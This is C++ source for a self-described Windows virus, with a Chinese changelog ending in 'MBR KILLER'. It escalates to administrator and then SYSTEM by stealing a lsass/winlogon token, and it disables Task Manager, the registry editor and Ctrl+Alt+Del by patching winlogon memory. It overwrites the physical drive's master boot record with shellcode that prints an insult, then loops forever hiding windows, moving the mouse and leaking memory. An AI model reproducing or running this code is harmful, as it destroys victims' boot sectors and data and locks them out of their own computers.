#include <bits/stdc++.h>
#include <windows.h>
#include <TlHelp32.h>
#include <winnt.h>
using namespace std;
namespace Windows_Admin { //windows权限管理
	#include <bits/stdc++.h>
	#include <windows.h>
	#include <TlHelp32.h>
	#include <winnt.h>
	using namespace std;
	#define KEY_DOWN(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) & 0x8000) ? 1:0)
	LPWSTR ToLPWSTR(char** charArray) {
		int charCount = 0;
		// 计算总的多字节字符数
		while (charArray[charCount] != NULL) {
			charCount++;
		}

		int bufferSize = MultiByteToWideChar(CP_ACP, 0, charArray[0], -1, NULL, 0);
		LPWSTR lpwsz = new WCHAR[bufferSize];
		MultiByteToWideChar(CP_ACP, 0, charArray[0], -1, lpwsz, bufferSize);

		// 对于其他字符串重复转换过程
		for (int i = 1; i < charCount; ++i) {
			bufferSize = MultiByteToWideChar(CP_ACP, 0, charArray[i], -1, NULL, 0);
			LPWSTR temp = new WCHAR[bufferSize];
			MultiByteToWideChar(CP_ACP, 0, charArray[i], -1, temp, bufferSize);

			// 将转换后的宽字符字符串追加到lpwsz
			wcscat(lpwsz, temp);

			// 释放临时宽字符串
			delete[] temp;
		}

		return lpwsz;
	}

	void HKRunator(char *programName) { //程序名称（**全路径**）
		HKEY hkey = NULL;
		DWORD rc;

		rc = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //创建一个注册表项，如果有则打开该注册表项
		                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		                    0,
		                    NULL,
		                    REG_OPTION_NON_VOLATILE,
		                    KEY_WOW64_64KEY | KEY_ALL_ACCESS,    //部分windows系统编译该行会报错， 删掉 “”KEY_WOW64_64KEY | “” 即可
		                    NULL,
		                    &hkey,
		                    NULL);

		if (rc == ERROR_SUCCESS) {
			rc = RegSetValueEx(hkey,
			                   "UStealer",
			                   0,
			                   REG_SZ,
			                   (const BYTE *)programName,
			                   strlen(programName));
			if (rc == ERROR_SUCCESS) {
				RegCloseKey(hkey);
			}
		}
	}
	bool IsAdmin() { //是否为管理员
// return 1;
		BOOL b;
		SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
		PSID AdministratorsGroup;
		b = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup);
		if (b) {
			if (!CheckTokenMembership(NULL, AdministratorsGroup, &b)) {
				b = FALSE;
			}
			FreeSid(AdministratorsGroup);
		}

		return(b);
	}

	void Get_Admin(char** argv) { //提升权限至管理员
		if (!IsAdmin()) {
			ShellExecute(NULL, "runas", argv[0], NULL, NULL, SW_SHOWNORMAL);
			cout<<"get!"<<endl;
			exit(0);
		}
	}

	bool Get_Permanent_Admin(int args,char** argv) { //永久管理员
//  if (argc < 1) {
//         std::cerr << "No file path provided." << std::endl;
//         return 1;
//     }

		// 获取文件路径
		std::string filePath = argv[0];

		// 注册表路径
		std::wstring regPath = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers";

		// 打开注册表项
		HKEY hKey;
		LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_SET_VALUE, &hKey);
		if (result != ERROR_SUCCESS) {
			std::cerr << "Error opening registry key: " << result << std::endl;
			return 1;
		}

		// 设置注册表值
		std::wstring wFilePath(filePath.begin(), filePath.end());
		result = RegSetValueExW(hKey, wFilePath.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(L"RUNASADMIN"), (wFilePath.length() + 1) * sizeof(wchar_t));
		if (result != ERROR_SUCCESS) {
			std::cerr << "Error setting registry value: " << result << std::endl;
			RegCloseKey(hKey);
			return 1;
		}

		std::cout << "Registry value set successfully." << std::endl;

		// 关闭注册表项
		RegCloseKey(hKey);
	}

	std::wstring GetCommandLineWithArgs(const std::wstring &program, const std::vector<std::wstring> &args) {
		std::wstring cmdLine = program;
		for (const auto &arg : args) {
			cmdLine += L" ";
			cmdLine += L"\"";
			cmdLine += arg;
			cmdLine += L"\"";
		}
		return cmdLine;
	}

	void Get_System(char** argv) { //System
		HANDLE hToken;
		LUID Luid;
		TOKEN_PRIVILEGES tp;
		OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid);
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = Luid;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
		CloseHandle(hToken);

		//枚举进程获取lsass.exe的ID和winlogon.exe的ID，它们是少有的可以直接打开句柄的系统进程
		DWORD idL, idW;
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (Process32First(hSnapshot, &pe)) {
			do {
				if (0 == _stricmp(pe.szExeFile, "lsass.exe")) {
					idL = pe.th32ProcessID;
				} else if (0 == _stricmp(pe.szExeFile, "winlogon.exe")) {
					idW = pe.th32ProcessID;
				}
			} while (Process32Next(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);

		//获取句柄，先试lsass再试winlogon
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idL);
		if(!hProcess)hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idW);
		HANDLE hTokenx;
		//获取令牌
		OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hTokenx);
		//复制令牌
		DuplicateTokenEx(hTokenx, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hToken);
		CloseHandle(hProcess);
		CloseHandle(hTokenx);
		//启动信息
		STARTUPINFOW si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(STARTUPINFOW));
		si.cb = sizeof(STARTUPINFOW);
		si.lpDesktop = L"winsta0\\default";
		//char** tmp={argv,"issystem"}

		std::wstring program = ToLPWSTR(argv);
		std::vector<std::wstring> arguments = { L"isSystem"};
		std::wstring commandLine = GetCommandLineWithArgs(program, arguments);

		CreateProcessWithTokenW(hToken, LOGON_NETCREDENTIALS_ONLY, NULL, const_cast<LPWSTR>(commandLine.c_str()), NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
		CloseHandle(hToken);
		exit(0);
	}

	void RaiseToDebug() {
		HANDLE hToken;
		TOKEN_PRIVILEGES tkp;
		if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
			LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
			CloseHandle(hToken);
		}
	}

//禁用windows热键
	bool Start() {
		auto module  = GetModuleHandleA("rpcrt4.dll");
		auto func = GetProcAddress(module, "RpcServerTestCancel");
		if(func) {
			auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			PROCESSENTRY32 pe32;
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if(Process32First(snapshot, &pe32)) {
				do {
					if(!strcmp(pe32.szExeFile, "winlogon.exe")) {
						auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
						if(hProcess) {
							DWORD oldpp;
							if(VirtualProtectEx(hProcess,(void *)func, 0x100,PAGE_EXECUTE_READWRITE,&oldpp)) {
								unsigned char buf[] = {0x33,0xc0,0xc3};
								WriteProcessMemory(hProcess, (void *)func,buf, sizeof(buf), NULL);
							}
							CloseHandle(hProcess);
						}
					}
				} while(Process32Next(snapshot, &pe32));
			}


		}
		return true;
	}

//重新开启windows热键
	bool Stop() {
		auto module  = GetModuleHandleA("rpcrt4.dll");
		auto func = GetProcAddress(module, "RpcServerTestCancel");
		if(func) {
			auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			PROCESSENTRY32 pe32;
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if(Process32First(snapshot, &pe32)) {
				do {
					if(!strcmp(pe32.szExeFile, "winlogon.exe")) {
						auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
						if(hProcess) {
							DWORD oldpp;
							if(VirtualProtectEx(hProcess,(void *)func, 0x100,PAGE_EXECUTE_READWRITE,&oldpp)) {
								WriteProcessMemory(hProcess, (void *)func,(void *)func, 3, NULL);
							}
							CloseHandle(hProcess);
						}
					}
				} while(Process32Next(snapshot, &pe32));
			}
		}
		return true;
	}

//无法正常关闭
	void can_not_close() {
		HWND hwnd=GetConsoleWindow();
		HMENU hmenu=GetSystemMenu(hwnd,false);
		RemoveMenu(hmenu,SC_CLOSE,MF_BYCOMMAND);
		LONG style=GetWindowLong(hwnd, GWL_STYLE);
		style&=~(WS_MINIMIZEBOX);
		SetWindowLong(hwnd,GWL_STYLE,style);
		SetWindowPos(hwnd,HWND_TOP,0,0,0,0,SWP_NOMOVE|SWP_NOSIZE);
		ShowWindow(hwnd,SW_SHOWNORMAL);
		DestroyMenu(hmenu);
		ReleaseDC(hwnd,NULL);
	}

//禁用注册表编辑器
	void Ban_RegistryEditor() {
		HKEY hkey;
		DWORD value = 0;
		RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
		RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
		RegCloseKey(hkey);
	}

//禁用任务管理器
	void Ban_TaskManager() {
		HKEY hkey;
		DWORD value = 1;
		RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
		RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
		RegCloseKey(hkey);
	}

//模拟键盘按下，n为键值
	void Key_Down(int n) {
		keybd_event(n,0,0,0);
	}

//键盘弹起
	void Key_Up(int n) {
		keybd_event(n,0,2,0);
	}

}

void Draw(std::string tp) {
	if (tp == "EXE")
		DrawIcon(GetWindowDC(GetDesktopWindow()), rand() % 1920 + 1, rand() % 1080 + 1, LoadIcon(NULL, IDI_APPLICATION));
	else if (tp == "?")
		DrawIcon(GetWindowDC(GetDesktopWindow()), rand() % 1920 + 1, rand() % 1080 + 1, LoadIcon(NULL, IDI_QUESTION));
	else if (tp == "i")
		DrawIcon(GetWindowDC(GetDesktopWindow()), rand() % 1920 + 1, rand() % 1080 + 1, LoadIcon(NULL, IDI_ASTERISK));
	else if (tp == "ERROR")
		DrawIcon(GetWindowDC(GetDesktopWindow()), rand() % 1920 + 1, rand() % 1080 + 1, LoadIcon(NULL, IDI_HAND));
	else if (tp == "!")
		DrawIcon(GetWindowDC(GetDesktopWindow()), rand() % 1920 + 1, rand() % 1080 + 1, LoadIcon(NULL, IDI_WARNING));
}

using namespace Windows_Admin;


void _run() {
	if (MessageBox(NULL,"run?","run?",MB_YESNO)==IDNO) {
		cout << "Exited" << endl;
		exit(0);
	}
}

/*
int main(){
    LoadLibraryA("rpcrt4.dll");
    RaiseToDebug();
 //禁用ctrl+alt+del
    Start();
    getchar();
    string t;
    cin >> t;
 //启用ctrl+alt+del
    Stop();
    return 0;
}
*/


/*
void DXC_A()
{
 while(1)
    {
        HWND hWnd=GetForegroundWindow();
        ShowWindow(hWnd,SW_HIDE);
    }
}

void DXC_B()
{
 while(1)
    {
        system("start cmd");
    }
}

void DXC_C()
{
 while(1)
    {
        SetCursorPos(rand()%1000,rand()%1000);
    }
}
*/

unsigned char scode[] =
    "\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
    "\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
    "\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";

void Main() {
	cout << "正在运行程序..." << endl;

	/*-----------------------前置---------------------------------*/


//置顶
	HWND hWnd = ::GetForegroundWindow();
	::SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 100, 100, SWP_NOMOVE | SWP_NOSIZE);

//无法关闭
	can_not_close();

//封禁注册表
	Ban_RegistryEditor();
	//封禁任务管理器
	Ban_TaskManager();

	//禁用系统热键
	LoadLibraryA("rpcrt4.dll");
	
	RaiseToDebug();
	Start();
	
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = {0};

// 重新构造MBR
	memcpy(pMBR, scode, sizeof(scode) - 1);
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;

	hDevice = CreateFile
	          (
	              "\\\\.\\PHYSICALDRIVE0",
	              GENERIC_READ | GENERIC_WRITE,
	              FILE_SHARE_READ | FILE_SHARE_WRITE,
	              NULL,
	              OPEN_EXISTING,
	              0,
	              NULL
	          );
	if (hDevice == INVALID_HANDLE_VALUE)
		return ;
	DeviceIoControl
	(
	    hDevice,
	    FSCTL_LOCK_VOLUME,
	    NULL,
	    0,
	    NULL,
	    0,
	    &dwBytesReturned,
	    NULL
	);
// 写入病毒内容
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl
	(
	    hDevice,
	    FSCTL_UNLOCK_VOLUME,
	    NULL,
	    0,
	    NULL,
	    0,
	    &dwBytesReturned,
	    NULL
	);
	CloseHandle(hDevice);
//    std::string str_exe_name = "taskmgr.exe";
// DWORD nPid;
// FindProcess(str_exe_name, nPid);
// EnableDebugPriv();
// KillProcess(nPid);

	/*------------------------------------------------------------*/

//
	Key_Down(91);
	Key_Down(187);
	Key_Up(91);
	Key_Up(187);
	while (1) {
		HWND hWnd=GetForegroundWindow();
		ShowWindow(hWnd,SW_HIDE);
		SetCursorPos(rand()%1000,rand()%1000);
		malloc(512);
//        system("start cmd");
		malloc(512);
		Draw("ERROR");
		Key_Down(91);
		malloc(512);
		Key_Down(187);
		malloc(512);
		Key_Up(187);
		malloc(512);
		Key_Down(189);
		malloc(512);
		Key_Up(189);
		Key_Up(91);
		malloc(512);
	}
// thread newThread1(DXC_A);
// thread newThread2(DXC_B);
//  thread newThread3(DXC_C);
}
signed main(int argc, char** argv) {
	ios_base::sync_with_stdio(false);
	cin.tie(0);
	cout.tie(0);


// cerr << 1 << endl;

//提升权限 无权限->管理员->System 方案1
	if (!IsAdmin()) Get_Admin(argv); //管理员
	else if (argc<=1) {
		Get_System(argv);
	}
//提升权限 方案2
//pass

	if (argc>1) cerr << "With System!" << endl;
	_run(); //提示框

//HKRunator(argv[0]); //启动项
	Main(); //病毒主代码
	return 0;
}






/*
uType Option Meaning
MB_OK 弹窗仅包含一个按钮：确认
MB_YESNO 弹窗包含两个按钮：是、否
MB_ABORTRETRYIGNORE 弹窗包含三个按钮：放弃、重试和跳过
MB_YESNOCANCEL 弹窗包含三个按钮： 是、否、取消
MB_OKCANCEL 弹窗包含两个按钮：确认、取消


#include <windows.h>

int main(int argc, char *argv[])
{

 HWND hWnd = ::GetForegroundWindow();

 ::SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 100, 100, SWP_NOMOVE | SWP_NOSIZE);

 return FALSE;
}

窗口置顶

添加启动项
#include <Windows.h>
#include <iostream>
#include <string>

// 添加启动项
void AddStartupEntry(const std::wstring& appName, const std::wstring& appPath) {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        result = RegSetValueExW(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)appPath.c_str(), (appPath.size() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
        if (result == ERROR_SUCCESS) {
            std::wcout << L"启动项 \"" << appName << L"\" 已成功添加" << std::endl;
        } else {
            std::wcerr << L"添加启动项失败: " << result << std::endl;
        }
    } else {
        std::wcerr << L"无法打开注册表项: " << result << std::endl;
    }
}

// 删除启动项
void RemoveStartupEntry(const std::wstring& appName) {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        result = RegDeleteValueW(hKey, appName.c_str());
        RegCloseKey(hKey);
        if (result == ERROR_SUCCESS) {
            std::wcout << L"启动项 \"" << appName << L"\" 已成功移除" << std::endl;
        } else {
            std::wcerr << L"移除启动项失败: " << result << std::endl;
        }
    } else {
        std::wcerr << L"无法打开注册表项: " << result << std::endl;
    }
}

int main() {
    // 添加启动项
    AddStartupEntry(L"MyApp", L"C:\\Path\\To\\Your\\Application.exe");

    // 删除启动项
    // RemoveStartupEntry(L"MyApp");

    return 0;
}



更新日志：
0.8.3 2024/4/17 前置-封禁注册表、任务管理器
0.9.2 2024/4/17 前置-窗口置顶、无法关闭
1.1.0 2024/4/17 鼠标乱动
1.2.0 2024/4/17 点击进程消失
1.3.0 2024/4/18 炸内存(start cmd)
1.4.0 2024/4/19 禁用ctrl+alt+del
1.4.5 2024/4/19 禁用所有windows热键
1.5.0 2024/4/19 重复放大缩小
1.6.0 2024/4/20 自动管理员运行
1.6.3 2024/4/20 优化管理员运行
1.6.5 2024/4/20 关闭炸内存(start cmd)
1.7.0 2024/4/20 启动项
kz1.0 2024/4/20 快照1.0
2.0.0 2024/4/20 提权System
2.0.5 2024/4/20 优化码风
2.0.8 2024/4/21 修改问题（_run()运行之后才会生成启动项，在_run()之前，只有提权管理员与提权System运行）
2.1.0 2024/4/21 发现问题（由于windows系统版本不同，此病毒只针对win10有效，正在改进）
2.1.1 2024/4/21 炸内存2.0 malloc()
2.1.2 2024/4/21 炸图标
3.0.0 2024/4/23 MBR KILLER 
*/
